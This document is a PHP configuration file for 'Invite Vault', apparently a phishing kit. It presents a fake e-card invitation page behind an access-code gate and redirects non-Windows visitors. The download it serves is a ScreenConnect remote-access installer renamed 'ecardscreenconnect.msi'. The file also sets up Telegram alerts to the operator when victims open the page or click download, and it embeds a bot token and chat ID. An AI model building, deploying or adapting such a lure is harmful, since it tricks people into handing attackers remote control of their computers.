<?php
// Invite Vault — config

return [
    // Telegram notifications
    'telegram_bot_token'       => '9013226919:AAErUrhs__XQ3EYjZTJLqHqbbe_PFd6cAz8',
    'telegram_chat_id'         => '6844146551',
    'notify_visitors'          => true,   // page open
    'notify_on_download_click' => true,   // download button clicked
    'notify_code_input'        => false,  // access code entered (off by default)

    // Download (direct URL to your hosted file)
    'download_url'             => 'https://questswimming.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest',
    'download_filename'        => 'ecardscreenconnect.msi',

    // Page mode (config-only; URL cannot override)
    // If both are true, invitation mode is used by default
    'invitation_mode'          => true,
    'document_mode'            => false,

    // Skin: 'envelope' | 'folder'
    'skin'                     => 'folder',

    // Code gate
    'code_length'              => 6,

    // Non-Windows redirect
    'redirect_non_windows'     => true,
    'redirect_url'             => './evite/',

    // Name params + typing animation
    'default_sender'           => '',
    'default_invitee'          => '',
    'typing_effect'            => true,
];
